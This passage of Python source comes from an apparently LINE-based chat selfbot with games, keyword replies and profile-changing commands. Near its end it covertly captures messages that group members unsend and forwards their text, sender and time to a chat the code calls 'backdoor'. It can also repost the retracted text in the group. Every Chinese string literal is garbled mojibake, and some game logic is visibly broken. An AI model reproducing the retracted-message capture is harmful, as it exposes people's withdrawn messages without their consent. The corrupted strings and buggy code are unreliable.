                            han.replyMessage(msg, f'ÂÄãÁ∞ΩÂ∑≤Êõ¥ÊîπÁÇ∫:\n{bio}')
                        else:
                            han.replyMessage(msg, "ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                            report(msg[2],msg[1],"Ê¨äÈôêËÄÖÂòóË©¶Êõ¥ÊîπÂÄãÁ∞Ω")
                    elif text.startswith("cbk:"):
                        if msg[1] in creator['creator']:
                            nb = msg[10][4:]
                            try:
                                han.sendMessage(nb,"Ê∏¨Ë©¶Êõ¥Êîπ")
                                backdoor['backdoor'] = nb
                                backupData()
                                han.replyMessage(msg,"Êõ¥ÊîπÊàêÂäü ÁõÆÂâçÂæåÂè∞ÁÇ∫:")
                                try:
                                    han.sendContact(to, nb)
                                except:
                                    f = han.getChats([nb])
                                    han.replyMessage(msg,"{}\nID:\n{}".format(str(f[1][0][6]),nb))
                                han.replyMessage(msg,"ÊèêÁ§∫:ÈáçÂïüÂæåÊâçÊúÉËÆäÊõ¥Êõ¥Êîπ")
                            except Exception as e:
                                han.replyMessage(msg,"Êõ¥ÊîπÂ§±Êïó ÂéüÂõ†:\n{}".format(e))
                        else:
                            han.replyMessage(msg,"ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                            report(msg[2],msg[1],"ÁÆ°ÁêÜÂì°ÂòóË©¶Êõ¥ÊîπÂæåÂè∞")  
                if msg[1] not in cd:
                    text=msg[10].lower()
                    if 'ÊúâÊ≤íÊúâ' in text:
                        a = 'Êúâ'
                        b = 'Ê≤íÊúâ'
                        c = random.choice([a,b])
                        han.replyMessage(msg, c)
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if 'ÊòØ‰∏çÊòØ' in text:
                        a = 'ÊòØ'
                        b = '‰∏çÊòØ'
                        c = random.choice([a,b])
                        han.replyMessage(msg, c)
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if 'Ë¶Å‰∏çË¶Å' in text:
                        a = 'Ë¶Å'
                        b = '‰∏çË¶Å'
                        c = random.choice([a,b])
                        han.replyMessage(msg, c)
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("ÊäΩ‰∫∫"):
                        key = msg[10][2:]
                        if key == "":
                            ch = []
                            gm = han.getChats([to])[1][0][8][1][4]
                            for x in gm:
                                ch.append(x)
                            lucky = random.choice(ch)
                            user = han.getContact(lucky)[22]
                            del ch
                            han.replyMessage(msg, f"ÊäΩÂà∞ÁöÑ‰∫∫ÊòØ:\n{user}")
                        else:
                            ch = []
                            gm = han.getChats([to])[1][0][8][1][4]
                            for x in gm:
                                ch.append(x)
                            lucky = random.choice(ch)
                            user = han.getContact(lucky)[22]
                            del ch
                            han.replyMessage(msg, f"ÊäΩÂà∞Ë¶Å{key}ÁöÑ‰∫∫ÊòØ:\n{user}")
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("ÊäΩÁ±§ "):
                        choice = []
                        key = msg[10][3:].split(" ") 
                        for i in key:
                            choice.append(i)
                        if len(choice) == 0:
                            han.replyMessage(msg, "Ê≤íÁµ¶ÊàëÈÅ∏È†ÖÊòØË¶ÅÈÅ∏ÂÄãder")
                        elif len(choice) == 1:
                            han.replyMessage(msg, "Âè™Áµ¶Êàë‰∏ÄÂÄãÈÅ∏È†ÖÊòØË¶ÅÈÅ∏ÂÄãder")
                        else:
                            han.replyMessage(msg,f'ÊàëÂπ´‰Ω†ÈÅ∏ÊìáÁöÑÊòØ:\n{random.choice(choice)}')
                        del choice
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("add_reply:"):
                        key = msg[10][10:].split(" ")
                        x = []
                        for i in key:
                            x.append(i)
                        if len(x) == 2:
                            if x[0] in reply['textreply']:
                                han.replyMessage(msg, "Â∑≤ÊúâÊ≠§ÈóúÈçµÂ≠ó")
                            else:
                                reply['textreply'][x[0]] = x[1]
                                han.replyMessage(msg, "Â∑≤Êñ∞Â¢ûÈóúÈçµÂ≠óÂõûÂæ©")
                                han.replyMessage(msg, f"‚ÄªÂÅµÊ∏¨ÈóúÈçµÂ≠ó:\n{x[0]}\n‚ÄªÂõûÂæ©Ë®äÊÅØ:\n{x[1]}")
                                backupData()
                        else:
                            han.replyMessage(msg, "Êñ∞Â¢ûÈóúÈçµÂ≠óÂõûÂæ©Â§±Êïó")
                        del x
                    if text.startswith("del_reply:"):
                        key = msg[10][10:]
                        if key in reply['textreply']:
                            del reply['textreply'][key]
                            han.replyMessage(msg, "Â∑≤Âà™Èô§ÈóúÈçµÂ≠óÂõûÂæ©")
                            backupData()
                        else:
                            han.replyMessage(msg, "ÁÑ°Ê≠§ÈóúÈçµÂ≠ó")
                    if text.startswith("readd_reply:"):
                        key = msg[10][12:].split(" ")
                        x = []
                        for i in key:
                            x.append(i)
                        if len(x) == 2:
                            if x[0] in reply['textreply']:
                                del reply['textreply'][x[0]]
                                reply['textreply'][x[0]] = x[1]
                                han.replyMessage(msg, "Â∑≤ÈáçË®≠ÈóúÈçµÂ≠óÂõûÂæ©")
                                han.replyMessage(msg, f"‚ÄªÂÅµÊ∏¨ÈóúÈçµÂ≠ó:\n{x[0]}\n‚ÄªÂõûÂæ©Ë®äÊÅØ:\n{x[1]}")
                                backupData()
                            else:
                                han.replyMessage(msg, "ÁÑ°Ê≠§ÈóúÈçµÂ≠ó")
                        else:
                            han.replyMessage(msg, "ÈáçË®≠ÈóúÈçµÂ≠óÂõûÂæ©Â§±Êïó")
                        del x
                    if text.startswith("add_creply:"):
                        key = msg[10][11:].split(" ")
                        x = []
                        for i in key:
                            x.append(i)
                        if len(x) == 2:
                            try:
                                han.getContact(x[1])
                                if x[0] in reply['contactreply']:
                                    han.replyMessage(msg, "Â∑≤ÊúâÊ≠§ÈóúÈçµÂ≠ó")
                                else:
                                    user = han.getContact(x[1])
                                    reply['contactreply'][x[0]] = x[1]
                                    han.replyMessage(msg, "Â∑≤Êñ∞Â¢ûÂèãË≥áÂõûÂæ©")
                                    han.replyMessage(msg, f"‚ÄªÂÅµÊ∏¨ÈóúÈçµÂ≠ó:\n{x[0]}\n‚ÄªÂõûÂæ©ÂèãË≥á:\n{user[22]}\n{x[1]}")
                                    backupData()
                            except:
                                han.replyMessage(msg, "Error-->invalid mid")
                        else:
                            han.replyMessage(msg, "Êñ∞Â¢ûÂèãË≥áÂõûÂæ©Â§±Êïó")
                        del x
                    if text.startswith("del_creply:"):
                        key = msg[10][11:]
                        if key in reply['contactreply']:
                            del reply['contactreply'][key]
                            han.replyMessage(msg, "Â∑≤Âà™Èô§ÂèãË≥áÂõûÂæ©")
                            backupData()
                        else:
                            han.replyMessage(msg, "ÁÑ°Ê≠§ÈóúÈçµÂ≠ó")
                    if text.startswith("readd_creply:"):
                        key = msg[10][13:].split(" ")
                        x = []
                        for i in key:
                            x.append(i)
                        if len(x) == 2:
                            try:
                                han.getContact(x[1])
                                if x[0] in reply['contactreply']:
                                    user = han.getContact(x[1])
                                    del reply['contactreply'][x[0]]
                                    reply['contactreply'][x[0]] = x[1]
                                    han.replyMessage(msg, "Â∑≤ÈáçË®≠ÂèãË≥áÂõûÂæ©")
                                    han.replyMessage(msg, f"‚ÄªÂÅµÊ∏¨ÈóúÈçµÂ≠ó:\n{x[0]}\n‚ÄªÂõûÂæ©ÂèãË≥á:\n{user[22]}\n{x[1]}")
                                    backupData()
                                else:
                                    han.replyMessage(msg, "ÁÑ°Ê≠§ÈóúÈçµÂ≠ó")
                            except:
                                han.replyMessage(msg, "Error-->invalid mid")
                        else:
                            han.replyMessage(msg, "ÈáçË®≠ÂèãË≥áÂõûÂæ©Â§±Êïó")
                        del x
                    if to in game['game']:
                        ranlist = []
                        def generate(lst):
                            while len(lst) < 4:
                                lst.append(randint(1,9))
                                if len(lst) > 1:
                                    x = 0
                                    while x < len(lst)-1:
                                        if lst[x] == lst[len(lst)-1]:
                                            del lst[len(lst)-1]
                                        else:
                                            x += 1
                            final_ans = ""
                            for i in range(0,len(lst)):
                                final_ans = final_ans + str(lst[i])
                            return final_ans
                        match text:
                            case "#game":
                                try:
                                    ret_ = "ŒûŒûŒûŒûŒûŒû„ÄòÈÅäÊà≤ÁãÄÊÖã„ÄôŒûŒûŒûŒûŒûŒû"
                                    if to in game['1a2b']:
                                        ret_ += "\n‚Äª1A2B:üü¢"
                                    else:
                                        ret_ += "\n‚Äª1A2B:üî¥"
                                    if to in game['guessnumber']:
                                        ret_ += "\n‚ÄªÁåúÊï∏Â≠ó:üü¢"
                                    else:
                                        ret_ += "\n‚ÄªÁåúÊï∏Â≠ó:üî¥"
                                    ret_ += "\nŒûŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒûŒû"
                                    han.replyMessage(msg, str(ret_))
                                    cd.append(msg[1])
                                    time.sleep(2)
                                    cd.remove(msg[1])
                                except Exception as e:
                                    han.replyMessage(msg,f'error-->\n{e}')
                                    cd.append(msg[1])
                                    time.sleep(2)
                                    cd.remove(msg[1])
                            case "ÊãâÈú∏":
                                cd.append(msg[1])
                                a = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                b = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                c = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                d = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                e = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                f = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                g = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                h = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                i = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                j = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                k = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                l = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                m = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                n = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                o = random.choice(["Ôºê","Ôºô","Ôºò","Ôºó","Ôºñ","Ôºï","Ôºî","Ôºì","Ôºí","Ôºí","Ôºë"])
                                slot = "ÊãâÈú∏Ê©üÊãâÈú∏‰∏ÄÊ¨°\nÁ¨¨‰∏ÄË°å==>{}  {}  {}<==\nÁ¨¨‰∫åË°å==>{}  {}  {}<==\nÁ¨¨‰∏âË°å==>{}  {}  {}<==\nÁ¨¨ÂõõË°å==>{}  {}  {}<==\nÁ¨¨‰∫îË°å==>{}  {}  {}<==\n‰ª•‰∏äÊòØÊÇ®ÁöÑÊãâÈú∏ÁµêÊûú".format(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o)
                                han.replyMessage(msg,slot)
                                time.sleep(2)
                                cd.remove(msg[1])
                            case '#1a2b':
                                if to not in game['guessnumber']:
                                    if to not in game['1a2b']:
                                        game['1a2b'].append(to)
                                        try:
                                            del game['1a2bans'][to]
                                        except:
                                            pass
                                        han.replyMessage(msg,"Â∑≤ÈÄ≤ÂÖ•1A2BÈÅäÊà≤")
                                        han.replyMessage(msg,"Ë´ãËº∏ÂÖ•4‰ΩçÊï∏Â≠ó‰∏¶‰ª•%‰ΩúÁÇ∫ÈñãÈ†≠")
                                        han.replyMessage(msg,"‰æãÂ¶Ç:%1234")
                                        x=generate(ranlist)
                                        game['1a2bans'][to]=x
                                        backupData()
                                    else:
                                        han.replyMessage(msg,"Â∑≤Á∂ìÊòØ1A2BÈÅäÊà≤ÁãÄÊÖã")
                                        han.replyMessage(msg,"Ë´ãÂÖàËº∏ÂÖ•ÈÄÄÂá∫1a2bÂæåÂÜçË©¶‰∏ÄÊ¨°")
                                else:
                                    han.replyMessage(msg,"ÂÖ∂‰ªñÈÅäÊà≤ÈÄ≤Ë°å‰∏≠\nË´ãÂÖàÈÄÄÂá∫ÂÖ∂‰ªñÈÅäÊà≤ÂæåÂÜçË©¶‰∏ÄÊ¨°")
                                    han.replyMessage(msg,"ÂèØËº∏ÂÖ•#game‰æÜÊü•Ë©¢")
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            case '#ÁåúÊï∏Â≠ó':
                                if to not in game['1a2b']:
                                    if to not in game['guessnumber']:
                                        game['guessnumber'].append(to)
                                        han.replyMessage(msg,"Â∑≤ÈÄ≤ÂÖ•ÁåúÊï∏Â≠óÈÅäÊà≤")
                                        han.replyMessage(msg,"Ë´ãÁµ¶ÂÆöÊï∏Â≠óÁØÑÂúç") 
                                        han.replyMessage(msg,"Ëº∏ÂÖ•ÊúÄÂ∞èÂÄº‰∏¶‰ª•lowest:‰ΩúÁÇ∫ÈñãÈ†≠")
                                        han.replyMessage(msg,"‰æãÂ¶Ç:lowest:1")
                                        backupData()
                                    else:
                                        han.replyMessage(msg,"Â∑≤Á∂ìÊòØÁåúÊï∏Â≠óÈÅäÊà≤ÁãÄÊÖã")
                                        han.replyMessage(msg,"Ë´ãÂÖàËº∏ÂÖ•ÈÄÄÂá∫ÁåúÊï∏Â≠óÂæåÂÜçË©¶‰∏ÄÊ¨°")
                                else:
                                    han.replyMessage(msg,"ÂÖ∂‰ªñÈÅäÊà≤ÈÄ≤Ë°å‰∏≠\nË´ãÂÖàÈÄÄÂá∫ÂÖ∂‰ªñÈÅäÊà≤ÂæåÂÜçË©¶‰∏ÄÊ¨°")
                                    han.replyMessage(msg,"ÂèØËº∏ÂÖ•#game‰æÜÊü•Ë©¢")
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                        if to in game['guessnumber']:
                            if text.startswith("lowest:"):
                                if to not in game['guessnumberlow']:
                                    lowest = msg[10][7:]
                                    game['guessnumberlow'][to] = int(lowest)
                                    backupData()
                                    han.replyMessage(msg,"ÊúÄÂ∞èÂÄºÂ∑≤Ë®≠ÂÆöÁÇ∫:" + lowest)
                                    if to not in game['guessnumberhigh']:
                                        han.replyMessage(msg,"Ëº∏ÂÖ•ÊúÄÂ§ßÂÄº‰∏¶‰ª•highest:‰ΩúÁÇ∫ÈñãÈ†≠")
                                        han.replyMessage(msg,"‰æãÂ¶Ç:highest:100")
                                    else:
                                        han.replyMessage(msg,f"Ë´ãËº∏ÂÖ•‰ªãÊñº{str(game['guessnumberlow'][to])}~{str(game['guessnumberhigh'][to])}Êï∏Â≠ó‰∏¶‰ª•%‰ΩúÁÇ∫ÈñãÈ†≠")
                                        han.replyMessage(msg,f"‰æãÂ¶Ç:%{str(randint(game['guessnumberlow'][to],game['guessnumberhigh'][to]))}")
                                        game['guessnumberans'][to] = randint(game['guessnumberlow'][to],game['guessnumberhigh'][to])
                                else:
                                    han.replyMessage(msg,"Â∑≤Ë®≠ÂÆöÈÅéÊúÄÂ∞èÂÄº")
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            if text.startswith("highest:"):
                                if to not in game['guessnumberhigh']:
                                    highest = msg[10][8:]
                                    game['guessnumberhigh'][to] = int(highest)
                                    backupData()
                                    han.replyMessage(msg,"ÊúÄÂ§ßÂÄºÂ∑≤Ë®≠ÂÆöÁÇ∫:" + highest)
                                    if game['guessnumberlow'] == "":
                                        han.replyMessage(msg,"Ëº∏ÂÖ•ÊúÄÂ∞èÂÄº‰∏¶‰ª•lowest:‰ΩúÁÇ∫ÈñãÈ†≠")
                                        han.replyMessage(msg,"‰æãÂ¶Ç:lowest:1")
                                    else:
                                        han.replyMessage(msg,f"Ë´ãËº∏ÂÖ•‰ªãÊñº{str(game['guessnumberlow'][to])}~{str(game['guessnumberhigh'][to])}Êï¥Êï∏‰∏¶‰ª•%‰ΩúÁÇ∫ÈñãÈ†≠")
                                        han.replyMessage(msg,f"‰æãÂ¶Ç:%{str(randint(game['guessnumberlow'][to],game['guessnumberhigh'][to]))}")
                                        game['guessnumberans'][to] = randint(game['guessnumberlow'][to],game['guessnumberhigh'][to])
                                else:
                                    han.replyMessage(msg,"Â∑≤Ë®≠ÂÆöÈÅéÊúÄÂ§ßÂÄº")
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            if text.startswith("%"):
                                if to not in game['guessnumberlow']or to not in game['guessnumberhigh']:
                                    han.replyMessage(msg,"Â∞öÊú™Áµ¶ÂÆöÁØÑÂúç")
                                else:
                                    guess = msg[10][1:]
                                    try:
                                        guess = int(guess)  
                                    except ValueError:  
                                        han.replyMessage(msg,'Ê†ºÂºèÈåØË™§ÔºåË´ãËº∏ÂÖ•Êï∏Â≠ó\n')
                                    if guess <= game['guessnumberlow'][to] or guess >= game['guessnumberhigh'][to]:
                                        han.replyMessage(msg,'Ë´ãËº∏ÂÖ•‰ªãÊñº' + str(game['guessnumberlow'][to]) + '~' + str(game['guessnumberhigh'][to]) + '‰πãÈñìÁöÑÊï¥Êï∏')
                                    if guess == game['guessnumberans'][to]:
                                        han.replyMessage(msg,"Á≠îÂ∞ç‰∫Ü! Á≠îÊ°àÂ∞±ÊòØ" + str(guess))
                                        game['guessnumber'].remove(to)
                                        del game['guessnumberlow'][to]
                                        del game['guessnumberhigh'][to]
                                        del game['guessnumberans'][to]
                                        backupData()
                                    elif guess < game['guessnumberans'][to]:
                                        game['guessnumberlow'][to] = guess
                                        backupData()
                                    else:
                                        game['guessnumberhigh'][to] = guess
                                        backupData()
                                    if to not in game['guessnumberlow'][to] or to not in game['guessnumberhigh'][to] or guess <= game['guessnumberlow'][to] or guess >= game['guessnumberhigh'][to]:
                                        pass
                                    else:
                                        han.replyMessage(msg,f"Êï∏Â≠ó‰ªãÊñº{str(game['guessnumberlow'][to])}~{str(game['guessnumberhigh'][to])}‰πãÈñì")
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            if text == "ÈÄÄÂá∫ÁåúÊï∏Â≠ó":
                                game['guessnumber'].remove(to)
                                del game['guessnumberlow'][to]
                                del game['guessnumberhigh'][to]
                                del game['guessnumberans'][to]
                                han.replyMessage(msg,"Â∑≤ÈÄÄÂá∫ÁåúÊï∏Â≠óÈÅäÊà≤")
                                backupData()
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            if text == "ÁåúÊï∏Â≠óÁ≠îÊ°à":
                                if to not in game['guessnumberans']:
                                    han.replyMessage(msg,"Â∞öÊú™Áµ¶ÂÆöÁØÑÂúç")
                                else:
                                    han.replyMessage(msg,"Á≠îÊ°àÁÇ∫:" + str(game['guessnumberans'][to]))
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                        if to in game['1a2b']:
                            if text.startswith("%"):
                                ans = msg[10][1:]
                                finans = game['1a2bans'][to]
                                counter = 1
                                result = 0
                                for i in range(0,len(finans)):
                                    for j in range(0,len(finans)):
                                        if ans[i] == finans[j]:
                                            if i == j:
                                                result += 10
                                            else:
                                                result += 1
                                han.replyMessage(msg,str(int(result/10)) + 'A' + str(result%10) + 'B')
                                counter += 1
                                if result == 40:
                                    han.replyMessage(msg,"ÊÅ≠Âñú‰Ω†! Á≠îÊ°àÂ∞±ÊòØ" + str(finans))
                                    game['1a2b'].remove(to)
                                    del game['1a2bans'][to]
                                    backupData()
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            if text == "ÈÄÄÂá∫1a2b":
                                game['1a2b'].remove(to)
                                del game['1a2bans'][to]
                                han.replyMessage(msg,"Â∑≤ÈÄÄÂá∫1A2BÈÅäÊà≤")
                                backupData()
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                            if text == "1a2bÁ≠îÊ°à":
                                han.replyMessage(msg,"Á≠îÊ°àÊòØ" + str(game['1a2bans'][to]))
                                cd.append(msg[1])
                                time.sleep(2)
                                cd.remove(msg[1])
                                
                        


            if msg[15] == 1:
                if settings["pic"] == True:
                    if msg[1] in settings["picmid"]:
                        try:
                            han.downloadObjectMsg(msg[4],path="test.jpg")
                            han.sendMessage(msg[2], "ÂúñÁâá‰∏ãËºâÂÆåÊàê\nÊ≠£Âú®Êõ¥ÊèõÈ†≠Ë≤º(ÔΩ°ÔΩ•œâÔΩ•ÔΩ°)")
                            han.updateProfileImage(path="test.jpg")
                            han.sendMessage(msg[2], "Êõ¥ÊîπÂÆåÊàê(ÔΩ°ÔΩ•œâÔΩ•ÔΩ°)")
                            settings["pic"] = False           
                            settings["picmid"] = [] 
                            backupData()   
                            os.remove("test.jpg")
                        except Exception as e:
                            print(e)
                            han.sendMessage(msg[2], "Êõ¥ÊîπÂ§±Êïó(ÔΩ°ÔΩ•œâÔΩ•ÔΩ°)")
                            han.sendMessage(msg[2], f'{e}')
                            settings["pic"] = False           
                            settings["picmid"] = [] 
                            backupData()
                            os.remove("test.jpg")
                if settings['cover'] == True:
                    if msg[1] in settings["covermid"]:
                        try:
                            han.downloadObjectMsg(msg[4],path="cover.jpg")
                            han.sendMessage(msg[2], "ÂúñÁâá‰∏ãËºâÂÆåÊàê\nÊ≠£Âú®Êõ¥ÊèõÂ∞ÅÈù¢(ÔΩ°ÔΩ•œâÔΩ•ÔΩ°)")
                            han.updateProfileCover(path="cover.jpg")
                            han.sendMessage(msg[2], "Êõ¥ÊîπÂÆåÊàê(ÔΩ°ÔΩ•œâÔΩ•ÔΩ°)")
                            settings["cover"] = False           
                            settings["covermid"] = [] 
                            backupData()   
                            os.remove("cover.jpg")
                        except Exception as e:
                            print(e)
                            han.sendMessage(msg[2], "Êõ¥ÊîπÂ§±Êïó(ÔΩ°ÔΩ•œâÔΩ•ÔΩ°)")
                            han.sendMessage(msg[2], f'{e}')
                            settings["cover"] = False           
                            settings["covermid"] = [] 
                            backupData()
                            os.remove("cover.jpg")
        if op[3] == 65:
            gid = op[10]
            msgid = op[11]
            msgids = han.getPreviousMessageIds(gid, 1000)
            target_msg = None
            for x in msgids[1]:
                if msgid == str(x[2]):
                    target_msg = x
                    break
            if target_msg is not None:
                target_msg = han.getPreviousMessagesV2(gid, target_msg[1], target_msg[2])[0]
                if target_msg[15] == 0:
                    if target_msg[1] not in cd:
                        text = target_msg[10]
                        unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
                        group = han.getChats([gid])[1][0][6]
                        user = han.getContact(target_msg[1])[22]
                        cd.append(target_msg[1])
                        if gid in red['reread']:
                            a = f"@chrline\n"
                            a += f"‚ÄªÊî∂ÂõûË®äÊÅØ:\n{text}"
                            a += f"\n‚ÄªÊî∂ÂõûÊôÇÈñì:\n{unstime}"
                            arr = [{"S": str(0),"E": str(8),"M": target_msg[1]}]
                            tag = {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}
                            han.sendMessage(gid, a,contentMetadata=tag)
                        else: 
                            pass
                        txt = "ŒûŒûŒûŒûŒûŒûŒû„ÄòÂæ©ËÆÄÁ≥ªÁµ±„ÄôŒûŒûŒûŒûŒûŒûŒû\n"
                        txt += "‚ÄªË®äÊÅØÈ°ûÂà•:ÊñáÂ≠ó\n"
                        txt += f"‚ÄªÁæ§ÁµÑ:\n{group}\n{gid}"
                        txt += f"\n‚ÄªÁôºÈÄÅËÄÖ:\n{user}\n{target_msg[1]}"
                        txt += f"\n‚ÄªÊî∂ÂõûÊôÇÈñì:\n{unstime}"
                        txt += f"\n‚ÄªË®äÊÅØÂÖßÂÆπ:\n{text}"
                        txt += f"\nŒûŒûŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒûŒûŒû"
                        han.sendMessage(backdoor['backdoor'], txt)
                        time.sleep(2)
                        cd.remove(target_msg[1])

                    # elif target_msg[15] == 1:
                    #     han.downloadObjectMsg(target_msg[4],path="test.jpg")
                    #     unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
                    #     group = han.getChats([gid])[1][0][6]
                    #     user = han.getContact(target_msg[1])[22]
                    #     txt = "ŒûŒûŒûŒûŒûŒûŒû„ÄòÂæ©ËÆÄÁ≥ªÁµ±„ÄôŒûŒûŒûŒûŒûŒûŒû\n"
                    #     txt += "‚ÄªË®äÊÅØÈ°ûÂà•:ÂúñÁâá\n"
                    #     txt += f"‚ÄªÁæ§ÁµÑ:\n{group}\n{gid}"
                    #     txt += f"\n‚ÄªÁôºÈÄÅËÄÖ:\n{user}\n{target_msg[1]}"
                    #     txt += f"\n‚ÄªÊî∂ÂõûÊôÇÈñì:\n{unstime}"
                    #     txt += f"\n‚ÄªË®äÊÅØÂÖßÂÆπ:\n‰∏ãÊñπÂúñÁâá"
                    #     txt += f"\nŒûŒûŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒûŒûŒû"
                    #     han.sendMessage(backdoor['backdoor'], txt)
                    #     han.sendImage(backdoor['backdoor'],"test.jpg")
                    #     if gid in red['reread']:
                    #         han.sendMessage(gid, txt)
                    #         han.sendImage(gid,"test.jpg")
                    #         os.remove("test.jpg")
                    #     else: 
                    #         pass
                    #         os.remove("test.jpg")


    def main(self):
        self.start()
        try:
            self.han.trace(self.bot)
        except Exception as e:
            print(e)
            os._exit(1)
if __name__=='__main__':
    bot()
